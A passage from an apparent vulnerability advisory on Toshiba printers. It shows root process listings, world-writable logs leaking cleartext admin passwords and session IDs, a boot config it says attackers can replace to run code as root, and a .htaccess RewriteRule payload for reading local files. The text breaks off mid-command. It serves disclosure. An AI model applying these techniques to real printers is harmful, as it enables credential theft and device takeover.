        &lt;startupType&gt;Automatic&lt;/startupType&gt;
        &lt;enabled&gt;1&lt;/enabled&gt;
        &lt;ProcessGroup&gt;TRUSTED&lt;/ProcessGroup&gt;
        &lt;StartParameters&gt;
            &lt;Param&gt;&amp;gt;&lt;/Param&gt;
            &lt;Param&gt;/work/log/ci/cipollproc.log&lt;/Param&gt;
        &lt;/StartParameters&gt;
        &lt;StartupCondition&gt;
            &lt;Condition&gt;
                &lt;Service name="cischeduler" state="Ready"&gt;&lt;/Service&gt;
            &lt;/Condition&gt;
        &lt;/StartupCondition&gt;
    &lt;/Service&gt;
    [...]
</code></pre>
<p>Analysis of <code>pspy32</code> running on the printer:</p>
<pre>
2023/05/27 20:32:43 CMD: UID=0     PID=4228   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:43 CMD: UID=0     PID=4229   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:46 CMD: UID=0     PID=4230   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:46 CMD: UID=0     PID=4231   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:50 CMD: UID=0     PID=4232   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:50 CMD: UID=0     PID=4233   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:53 CMD: UID=0     PID=4234   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:53 CMD: UID=0     PID=4235   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:32:56 CMD: UID=0     PID=4236   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
<font color=red>2023/05/27 20:32:56 CMD: UID=0     PID=4237   | ./cissm -T 7 -d ssm.xml</font>
2023/05/27 20:32:56 CMD: UID=0     PID=4238   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
[...]
<font color=red>2023/05/27 20:35:26 CMD: UID=0     PID=4393   | ./cissm -T 7 -d ssm.xml</font>
[...]
<font color=red>2023/05/27 20:37:56 CMD: UID=0     PID=4532   | ./cissm -T 7 -d ssm.xml</font>
[...]
<font color=red>2023/05/27 20:39:56 CMD: UID=0     PID=4676   | ./cissm -T 7 -d ssm.xml</font>
[...]
2023/05/27 20:42:19 CMD: UID=0     PID=4831   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:19 CMD: UID=0     PID=4832   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:22 CMD: UID=0     PID=4833   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:22 CMD: UID=0     PID=4834   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:25 CMD: UID=0     PID=4835   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:25 CMD: UID=0     PID=4836   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
<font color=red>2023/05/27 20:42:26 CMD: UID=0     PID=4837   | ./cissm -T 7 -d ssm.xml</font>
2023/05/27 20:42:27 CMD: UID=0     PID=4839   | sh -c ps -eo stat,comm | grep -e "^Z.*agent" -e "^Z.*ebx_dl" -e "^Z.*de_ipfax" 
2023/05/27 20:42:27 CMD: UID=0     PID=4838   | sh -c ps -eo stat,comm | grep -e "^Z.*agent" -e "^Z.*ebx_dl" -e "^Z.*de_ipfax" 
2023/05/27 20:42:29 CMD: UID=0     PID=4840   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:29 CMD: UID=0     PID=4841   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:32 CMD: UID=0     PID=4842   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi 
2023/05/27 20:42:32 CMD: UID=0     PID=4843   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi
[...]
</pre>

<p>An attacker can remotely compromise any Toshiba printer.</p>
<p>The <code>/home/SYSROM_SRC/build/common/bin/ssm.xml</code> configuration file can be replaced by any local or remote attacker to run any malicious program as root when the printer starts.</p>
<p>Attackers can backdoor the printer.</p>
<p><a id="passwords-logs"></a></p>
<h2>Details - Passwords stored in clear-text logs and insecure logs</h2>
<p>It was observed that passwords are stored in clear-text logs.</p>
<p>Some logs are stored inside the <code>/ramdisk/work/log/al</code> directory with insecure permissions, allowing any local attacker to read and modify these files:</p>
<pre><code>bash-4.1# ls -laR /ramdisk/work/log/al/*
-rw-rw-rw- 1 root trusted  42678 May 23 16:10 /ramdisk/work/log/al/accounting.log.0.txt
-rw-rw-rw- 1 root trusted   2228 May 23 15:14 /ramdisk/work/log/al/address.log.0.txt
-rw-rw-rw- 1 root trusted   6877 May 23 15:16 /ramdisk/work/log/al/alPanelStartLEDHandler.log.0.txt
-rw-rw-rw- 1 root trusted  23536 May 23 16:10 /ramdisk/work/log/al/alPanelUIMessageHandler.log.0.txt
-rw-rw-rw- 1 root trusted     79 May 23 15:14 /ramdisk/work/log/al/albluetooth.log.0.txt
-rw-rw-rw- 1 root trusted    449 May 23 15:14 /ramdisk/work/log/al/alcloning.log.0.txt
-rw-rw-rw- 1 root trusted   1594 May 23 15:14 /ramdisk/work/log/al/alcloudclient.log.0.txt
-rw-rw-rw- 1 root trusted    987 May 23 15:14 /ramdisk/work/log/al/aldevauthmgmtplugin.log.0.txt
-rw-rw-rw- 1 root trusted 307378 May 23 16:11 /ramdisk/work/log/al/aldeviceconfig.log.0.txt
-rw-rw-rw- 1 root trusted  29171 May 23 15:16 /ramdisk/work/log/al/aldeviceservice.log.0.txt
-rw-rw-rw- 1 root trusted    128 May 23 15:15 /ramdisk/work/log/al/aleSCL.log.0.txt
-rw-rw-rw- 1 root trusted    474 May 23 15:14 /ramdisk/work/log/al/alexportimport.log.0.txt
-rw-rw-rw- 1 root trusted   1437 May 23 15:14 /ramdisk/work/log/al/alfilestoragem.log.0.txt
-rw-rw-rw- 1 root trusted  13465 May 23 16:11 /ramdisk/work/log/al/allicensemgmt.log.0.txt
-rw-rw-rw- 1 root trusted   5380 May 23 15:14 /ramdisk/work/log/al/almaintenanceplugin.log.0.txt
-rw-rw-rw- 1 root trusted    111 May 23 15:14 /ramdisk/work/log/al/alnfcplugin.log.0.txt
-rw-rw-rw- 1 root trusted   4432 May 23 16:05 /ramdisk/work/log/al/alulm.log.0.txt
-rw-rw-rw- 1 root trusted    682 May 23 15:14 /ramdisk/work/log/al/alvnclauncher.log.0.txt
-rw-rw-rw- 1 root trusted  67235 May 23 16:08 /ramdisk/work/log/al/appmanager.log.0.txt
-rw-rw-rw- 1 root trusted  31306 May 23 16:11 /ramdisk/work/log/al/authplugin.log.0.txt
-rw-rw-rw- 1 root trusted    590 May 23 15:15 /ramdisk/work/log/al/bonjour.log.0.txt
-rw-rw-rw- 1 root trusted 147834 May 23 16:15 /ramdisk/work/log/al/boserver.log.0.txt
-rwxrwxrwx 1 root trusted 250542 May 23 16:14 /ramdisk/work/log/al/boserverEvent.log.28.txt
-rw-rw-rw- 1 root trusted   1110 May 23 15:14 /ramdisk/work/log/al/cbamanager.log.0.txt
-rw-rw-rw- 1 root trusted     98 May 23 15:14 /ramdisk/work/log/al/eBRlog.log.0.txt
-rw-rw-rw- 1 root trusted   3311 May 23 15:15 /ramdisk/work/log/al/efile.log.0.txt
-rwxrwxrwx 1 root trusted    567 May 23 16:10 /ramdisk/work/log/al/grpmgrplugin.log.0.txt
-rw-rw-rw- 1 root trusted   2277 May 23 16:10 /ramdisk/work/log/al/hdm.log.0.txt
-rw-rw-rw- 1 root trusted    206 May 23 15:15 /ramdisk/work/log/al/ifaxrx.log.0.txt
-rw-rw-rw- 1 root trusted   1037 May 23 15:14 /ramdisk/work/log/al/jobcontroller.log.0.txt
-rw-rw-rw- 1 root trusted   4714 May 23 15:41 /ramdisk/work/log/al/jtm.log.0.txt
-rw-rw-rw- 1 root trusted    610 May 23 15:15 /ramdisk/work/log/al/logmanagerplugin.log.0.txt
-rw-rw-rw- 1 root trusted 286932 May 23 15:23 /ramdisk/work/log/al/logretriever.log.0.txt
-rw-rw-rw- 1 root trusted    214 May 23 15:15 /ramdisk/work/log/al/network-ipv6.log.0.txt
-rw-rw-rw- 1 root trusted  22498 May 23 15:16 /ramdisk/work/log/al/nsm.log.0.txt
-rw-rw-rw- 1 root trusted 169537 May 23 16:01 /ramdisk/work/log/al/panel.log.0.txt
-rw-rw-rw- 1 root trusted   3403 May 23 15:15 /ramdisk/work/log/al/printmanager.log.0.txt
-rw-rw-rw- 1 root trusted  26623 May 23 16:10 /ramdisk/work/log/al/prm.log.0.txt
-rw-rw-rw- 1 root trusted   1264 May 23 15:15 /ramdisk/work/log/al/remoteApplication.log.0.txt
-rw-rw-rw- 1 root trusted 565116 May 23 16:11 /ramdisk/work/log/al/renderer.log.2.txt
-rw-rw-rw- 1 root trusted   2434 May 23 15:14 /ramdisk/work/log/al/reportmanager.log.0.txt
-rw-rw-rw- 1 root trusted    426 May 23 15:14 /ramdisk/work/log/al/reportmsgr.log.0.txt
-rw-rw-rw- 1 root trusted  20834 May 23 16:11 /ramdisk/work/log/al/restrictionmode.log.0.txt
-rw-rw-rw- 1 root trusted    732 May 23 16:10 /ramdisk/work/log/al/rolemanagerplugin.log.0.txt
-rw-rw-rw- 1 root trusted  12464 May 23 16:11 /ramdisk/work/log/al/securitysettingsplugin.log.0.txt
-rw-rw-rw- 1 root trusted  19963 May 23 15:15 /ramdisk/work/log/al/sharedprint.log.0.txt
-rw-rw-rw- 1 root trusted    159 May 23 15:15 /ramdisk/work/log/al/slp.log.0.txt
-rw-rw-rw- 1 root trusted    798 May 23 15:15 /ramdisk/work/log/al/snmpd.log.0.txt
-rw-rw-rw- 1 root trusted  12287 May 23 15:15 /ramdisk/work/log/al/stage2.log.0.txt
-rw-rw-rw- 1 root trusted   5955 May 23 15:15 /ramdisk/work/log/al/swupdate.log.0.txt
-rw-rw-rw- 1 root trusted   2306 May 23 15:14 /ramdisk/work/log/al/usb.log.0.txt
-rw-rw-rw- 1 root trusted   1113 May 23 15:15 /ramdisk/work/log/al/usbprn.log.0.txt
-rw-rw-rw- 1 root trusted  14238 May 23 16:10 /ramdisk/work/log/al/usermanagerplugin.log.0.txt
-rw-rw-rw- 1 root trusted   2553 May 23 15:14 /ramdisk/work/log/al/viewplugin.log.0.txt

/ramdisk/work/log/al/epfx:
total 28
drwxrwxrwx 4 root   trusted     0 May 23 15:14 .
drwxrwxrwx 5 root   trusted     0 May 23 16:10 ..
-rwxrwxrwx 1 root   trusted 28010 May 23 16:08 eprocessframework.log.0.txt
drwxrwxrwx 2 apache trusted     0 May 23 15:14 httpd_worker_1711
drwxrwxrwx 2 apache trusted     0 May 23 15:14 httpd_worker_1712

/ramdisk/work/log/al/wsp:
total 4
drwxrwxrwx 2 root trusted    0 May 23 15:15 .
drwxrwxrwx 5 root trusted    0 May 23 16:10 ..
-rw-rw-rw- 1 root trusted 3600 May 23 16:14 alwsprint.log.0.txt

/ramdisk/work/log/al/wsscn:
total 4
drwxrwxrwx 2 root trusted    0 May 23 15:15 .
drwxrwxrwx 5 root trusted    0 May 23 16:10 ..
-rw-rw-rw- 1 root trusted 1083 May 23 15:15 alwswsc.log.0.txt
bash-4.1#
</code></pre>
<p><a id="passwords-logs-01"></a></p>
<h3>Clear-text password written in logs when an user logs into the printer</h3>
<p>When a user logs into the TopAccess web interface, the password will be written in logs that are world-readable as shown below.</p>
<p>Login as admin with the password <code>PASSWORD-SECRET-PIERRE</code>, we can see the password saved into 2 log files that are world-readable:</p>
<ul>
<li><code>/ramdisk/work/log/al/boserverEvent.log.*.txt</code></li>
<li><code>/ramdisk/al/network/log/http.log</code></li>
</ul>
<p>Leak of credentials inside the log files:</p>
<pre><code>bash-4.1# grep -ri PIER .
./work/log/al/boserverEvent.log.28.txt:&lt;Evt&gt;&lt;t&gt;05/27 16:18:39443877&lt;/t&gt;&lt;Set&gt;&lt;sID&gt;ContentWebServer_10.0.0.2.fda0f003cf95b852233893df36d9b1ff&lt;/sID&gt;&lt;pID&gt;8556&lt;/pID&gt;&lt;pName&gt;httpd&lt;/pName&gt;&lt;SetValue&gt;&lt;Payload XMLPayLoad = "true" overrideDelta = "true"&gt;&lt;path&gt;&lt;/path&gt;&lt;value&gt;&lt;Authentication&gt;&lt;UserCredential&gt;&lt;userName&gt;admin&lt;/userName&gt;&lt;passwd&gt;PASSWORD-SECRET-PIERRE&lt;/passwd&gt;&lt;ipaddress&gt;10.0.0.2&lt;/ipaddress&gt;&lt;DepartmentManagement isEnable="false"&gt;&lt;requireDepartment/&gt;&lt;/DepartmentManagement&gt;&lt;domainName/&gt;&lt;applicationType&gt;TOP_ACCESS&lt;/applicationType&gt;&lt;/UserCredential&gt;&lt;/Authentication&gt;&lt;/value&gt;&lt;/Payload&gt;&lt;/SetValue&gt;&lt;/Set&gt;&lt;/Evt&gt;
./al/network/log/http.log:[Fri May 27 16:18:39.519454 2023] [contentwebserver:debug] [pid 8556] ccontentwebserver.cpp(4175): [client 10.0.0.2:41700] PASSWORD-SECRET-PIERRE, referer: http://10.0.0.1:8080/TopAccessLogin.html?v=1670282309ta
</code></pre>
<p>These files have insecure permissions allowing any user to retrieve the passwords and to modify the logs.</p>
<p>The files can be also modified by a remote attacker using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<pre>
bash-4.1# ls -la /ramdisk/al/network/log/http.log
ls -la /ramdisk/al/network/log/http.log
<font color=red>-rw-rw-rw-</font> 1 root trusted 663910 May 27 16:20 /ramdisk/al/network/log/http.log
bash-4.1# ls -la /ramdisk/work/log/al/boserverEvent.log.28.txt
ls -la /ramdisk/work/log/al/boserverEvent.log.28.txt
<font color=red>-rwxrwxrwx</font> 1 root trusted 715841 May 27 16:20 /ramdisk/work/log/al/boserverEvent.log.28.txt
bash-4.1#
</pre>

<p><a id="passwords-logs-02"></a></p>
<h3>Clear-text password written in logs when a password is modified</h3>
<p>Using the TopAccess web interface, it is possible to update passwords of users.</p>
<p><img alt="" src="images/2024-toshiba-users-password-logs.png" /></p>
<p>Such password will be found in the log files (<code>NEW-PASSWORD-PIERRE</code>):</p>
<pre><code>bash-4.1# grep -r NEW-PASSWORD-PIERRE .
./work/log/al/boserverEvent.log.28.txt:&lt;Evt&gt;&lt;t&gt;05/27 16:22:22933938&lt;/t&gt;&lt;Set&gt;&lt;sID&gt;ContentWebServer_10.0.0.2.63e5f73ea1d7ecf9cfd935393adb8b11&lt;/sID&gt;&lt;pID&gt;4974&lt;/pID&gt;&lt;pName&gt;httpd&lt;/pName&gt;&lt;SetValue&gt;&lt;Payload XMLPayLoad = "true" overrideDelta = "true"&gt;&lt;path&gt;&lt;/path&gt;&lt;value&gt;&lt;UserManager&gt;&lt;View&gt;&lt;UpdateUser&gt;&lt;User ID="10002"&gt;&lt;Information&gt;&lt;passwd&gt;NEW-PASSWORD-PIERRE&lt;/passwd&gt;&lt;UserSoftKeyboardDisplay&gt;true&lt;/UserSoftKeyboardDisplay&gt;&lt;/Information&gt;&lt;/User&gt;&lt;/UpdateUser&gt;&lt;/View&gt;&lt;/UserManager&gt;&lt;/value&gt;&lt;/Payload&gt;&lt;/SetValue&gt;&lt;/Set&gt;&lt;/Evt&gt;
bash-4.1#
</code></pre>
<p>And this log file also has insecure permissions, allowing any user to retrieve the passwords or to modify the log file.</p>
<p>The files can be also modified by a remote attacker using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<pre>
bash-4.1# ls -la /ramdisk/work/log/al/boserverEvent.log.28.txt
ls -la /ramdisk/work/log/al/boserverEvent.log.28.txt
<font color=red>-rwxrwxrwx</font> 1 root trusted 886685 May 27 16:23 /ramdisk/work/log/al/boserverEvent.log.28.txt
bash-4.1#
</pre>

<p>An attacker can retrieve passwords.</p>
<p>An attacker can modify the logs.</p>
<p>A remote attacker can retrieve the credentials and bypass the authentication mechanism by uploading a .htaccess file containing a RewriteRule (<code>RewriteRule /pwned.txt file:/path/to/local/file</code>), using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p><a id="sessions-logs-01"></a></p>
<h2>Details - Leak of authentication sessions in insecure logs in /ramdisk/work/log directory</h2>
<p>It was observed that the session cookies, used for authentication, are stored in clear-text logs. These logs are world-readable and some can also be freely modified by any local attacker.</p>
<p>Some logs are stored inside the <code>/ramdisk/work/log</code> directory with insecure permissions. We can find the authentication sessions (e.g. <code>ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e</code>) inside.</p>
<p>Leak of sessions inside the log files:</p>
<pre><code>bash-4.1# pwd
/work/log
bash-4.1# grep -r '10.0.0.2\.' *
[...]
./log/al/boserverEvent.log.26.txt:&lt;Evt&gt;&lt;t&gt;05/30 15:50:21222835&lt;/t&gt;&lt;Session "timerReset"&gt;&lt;id&gt;ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e&lt;/id&gt;&lt;num&gt;658&lt;/num&gt;&lt;pID&gt;2670&lt;/pID&gt;&lt;pName&gt;alappmanager&lt;/pName&gt;&lt;newTimerValue&gt;0&lt;/newTimerValue&gt;&lt;/Session&gt;&lt;/Evt&gt;
./log/al/boserver.log.0.txt:05/30 15:50:05535294 Pid= 1657,Tid= 1784,cborepository.cpp: 5340:WRN:HANDLECMD_RES: Response of Command 'GetSettings' from Plugin to 'httpd' in SessionID(ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e).
./log/al/boserver.log.0.txt:05/30 15:50:05552743 Pid= 1657,Tid= 1783,cborepository.cpp: 4816:WRN:DELIVERCMD: Delegating Command 'LicenseEnableCheck' from 'httpd' to Plugin 'LicenseMgmt-0x9f' with SessionID(ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e).
./log/al/boserver.log.0.txt:05/30 15:50:05556758 Pid= 1657,Tid= 1785,cborepository.cpp: 5340:WRN:HANDLECMD_RES: Response of Command 'LicenseEnableCheck' from Plugin to 'httpd' in SessionID(ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e).
./log/al/boserver.log.0.txt:05/30 15:50:14741108 Pid= 1657,Tid= 1784,cborepository.cpp: 4816:WRN:DELIVERCMD: Delegating Command 'LicenseEnableCheck' from 'httpd' to Plugin 'LicenseMgmt-0x9f' with SessionID(ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e).
./log/al/boserver.log.0.txt:05/30 15:50:14745065 Pid= 1657,Tid= 1783,cborepository.cpp: 5340:WRN:HANDLECMD_RES: Response of Command 'LicenseEnableCheck' from Plugin to 'httpd' in SessionID(ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e).
./log/al/aldeviceconfig.log.0.txt:  * SessionID         : ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e
./log/al/aldeviceconfig.log.0.txt:  * DeltaDocName      : hdb:/ramdisk/al/tmp/ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e/DiagnosticModeTransactionDoc_ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e
[...]
./log/al/aldeviceconfig.log.0.txt:  * DeltaDocName      : hdb:/ramdisk/al/tmp/ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e/DiagnosticModeTransactionDoc_ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e
./log/al/sapp/python_settingapp.log:03/16 20:57:34966 Pid= 5653 Tid= 1820326768 tweens.py       176 WARNING Add session map. key = ContentWebServer_10.0.0.2.fc4db19cc6c8eba31abca23ece735dd7 value = ContentWebServer_10.0.0.2.fc4db19cc6c8eba31abca23ece735dd7
./log/al/sapp/python_settingapp.log:03/16 21:08:35016 Pid= 5653 Tid= 1675623280 tweens.py       347 WARNING Delete session map. key = ContentWebServer_10.0.0.2.fc4db19cc6c8eba31abca23ece735dd7 value = ContentWebServer_10.0.0.2.fc4db19cc6c8eba31abca23ece735dd7, length1
./log/al/authplugin.log.0.txt:05/30 15:16:07935854 Pid= 1872,UserAuthManger.cpp:11476:ERR:delta Doc Name::hdb:/ramdisk/al/tmp/ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e/AuthenticationTransactionDoc_ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e
[...]
./log/al/renderer.log.1.txt:05/30 20:21:13780508 Pid= 1992,Tid= 2939,LegacyPanel/src/cpanelmanager.cpp: 2983:WRN:Rcv ST : 72 : 1c000001 : &lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;Notification&gt;&lt;Payload model="pull"&gt;&lt;path&gt;SecurityConfiguration/SecuritySettings/isLoginReqd&lt;/path&gt;&lt;sessionID&gt;ContentWebServer_10.0.0.2.ab52ced8304357f2b382460bbdd797dc&lt;/sessionID&gt;&lt;subscriptionID&gt;1275&lt;/subscriptionID&gt;&lt;/Payload&gt;&lt;/Notification&gt;
[...]
/log/al/prm.log.0.txt:05/30 15:18:16563007 Pid= 1885,Tid= 2163,manager.cpp: 1874:ERR:Delta Document hdb:/ramdisk/al/tmp/ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e/PresentationResourcesTransactionDoc_ContentWebServer_10.0.0.2.f5fc067bb786772b6815cf972565414e could not be opened. Creating it
</code></pre>
<p>We can list the files containing such authentication sessions:</p>
<ul>
<li>log/al/aldeviceconfig.log.0.txt</li>
<li>log/al/appmanager.log.0.txt</li>
<li>log/al/appmanagerlibrary.log.0.txt</li>
<li>log/al/authplugin.log.0.txt</li>
<li>log/al/boserver.log.0.txt</li>
<li>log/al/boserverEvent.log.26.txt</li>
<li>log/al/epfx/eprocessframework.log.0.txt</li>
<li>log/al/prm.log.0.txt</li>
<li>log/al/renderer.log.0.txt</li>
<li>log/al/renderer.log.1.txt</li>
<li>log/al/renderer.log.2.txt</li>
<li>log/al/sapp/python_settingapp.log</li>
<li>log/al/webpanel/eapi.log.0.txt</li>
</ul>
<p>Using the shell:</p>
<pre><code>bash-4.1# grep -r '10.0.0.2\.' * | sed -e 's#:# #' | awk '{ print $1 }' | sort | uniq
log/al/aldeviceconfig.log.0.txt
log/al/appmanager.log.0.txt
log/al/appmanagerlibrary.log.0.txt
log/al/authplugin.log.0.txt
log/al/boserver.log.0.txt
log/al/boserverEvent.log.26.txt
log/al/epfx/eprocessframework.log.0.txt
log/al/prm.log.0.txt
log/al/renderer.log.0.txt
log/al/renderer.log.1.txt
log/al/renderer.log.2.txt
log/al/sapp/python_settingapp.log
log/al/webpanel/eapi.log.0.txt
log/al/webpanel/python_ta.log
</code></pre>
<p>These files have insecure permissions allowing any user to retrieve the passwords, and some files can be freely modified by any local attacker (or any remote attacker using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability):</p>
<p>Insecure permissions for log files:</p>
<pre>
bash-4.1# for i in $(grep -r '10.0.0.2\.' * | sed -e 's#:# #' | awk '{ print $1 }' | sort | uniq); do ls -la $i;done
<font color=red>-rw-r--r--</font> 1 apache trusted 177116 May 30 15:51 log/al/aldeviceconfig.log.0.txt
<font color=red>-rw-r--r--</font> 1 apache trusted 57508 May 30 15:51 log/al/appmanager.log.0.txt
<font color=red>-rwxrwxrwx</font> 1 root trusted 285227 May 30 16:15 log/al/appmanagerlibrary.log.0.txt
<font color=red>-rw-r--r--</font> 1 apache trusted 8839 May 30 15:51 log/al/authplugin.log.0.txt
<font color=red>-rw-r--r--</font> 1 apache trusted 57082 May 30 15:51 log/al/boserver.log.0.txt
<font color=red>-rwxr-xr-x</font> 1 apache trusted 850786 May 30 15:51 log/al/boserverEvent.log.26.txt
<font color=red>-rwxr-xr-x</font> 1 apache trusted 18608 May 30 15:51 log/al/epfx/eprocessframework.log.0.txt
<font color=red>-rw-r--r--</font> 1 apache trusted 18151 May 30 15:51 log/al/prm.log.0.txt
<font color=red>-rwxrwxrwx</font> 1 root trusted 1048682 May 30 19:28 log/al/renderer.log.0.txt
<font color=red>-rwxrwxrwx</font> 1 root trusted 1048606 May 30 21:50 log/al/renderer.log.1.txt
<font color=red>-rw-r--r--</font> 1 apache trusted 527501 May 30 15:51 log/al/renderer.log.2.txt
<font color=red>-rwxrwxrwx</font> 1 apache trusted 1958 May 30 21:08 log/al/sapp/python_settingapp.log
<font color=red>-rwxrwxrwx</font> 1 root trusted 669880 May 30 16:15 log/al/webpanel/eapi.log.0.txt
<font color=red>-rwxrwxrwx</font> 1 apache trusted 311373 May 30 15:53 log/al/webpanel/python_ta.log
</pre>

<p>An attacker can retrieve authentication sessions.</p>
<p>A remote attacker can retrieve the credentials and bypass the authentication mechanism by uploading a .htaccess file containing a RewriteRule (<code>RewriteRule /pwned.txt file:/path/to/local/file</code>), using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p><a id="sessions-logs-02"></a></p>
<h2>Details - Leak of authentication sessions in insecure logs in /ramdisk/al/network/log directory</h2>
<p>It was observed that the sessions are stored in clear-text logs. These logs are world-readable and some can also be freely modified by any local attacker.</p>
<p>Some logs are stored inside the <code>/ramdisk/al/network/log</code> directory with insecure permissions. We can find the authentication sessions inside:</p>
<pre>
bash-4.1# pwd
/ramdisk/al/network/log
bash-4.1# ls -la
total 184
drwxr-xr-x 6 root root        0 May 30 10:38 .
drwxr-xr-x 7 root root        0 May 30 10:39 ..
-rw-rw-rw- 1 root trusted  1455 May 30 10:38 dibbler-client.log
-rw-rw-rw- 1 root trusted 23051 May 30 16:48 hp9100.log.0.txt
-rw-rw-rw- 1 root trusted 58886 May 30 17:29 http.log
-rw-rw-rw- 1 root trusted  6143 May 30 17:29 http_access.log
-rw-rw-rw- 1 root trusted  9194 May 30 14:08 https.log
-rw-rw-rw- 1 root trusted   962 May 30 15:01 lprng.log.0.txt
-rw-r----- 1 root adm      8767 May 30 16:38 maillog
-rw-rw-rw- 1 root trusted 58619 May 30 17:23 nqlog.log
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsd
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsm
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsp
drwxrwxrwx 2 root trusted     0 May 30 10:38 wsscn
bash-4.1# grep SessionID *
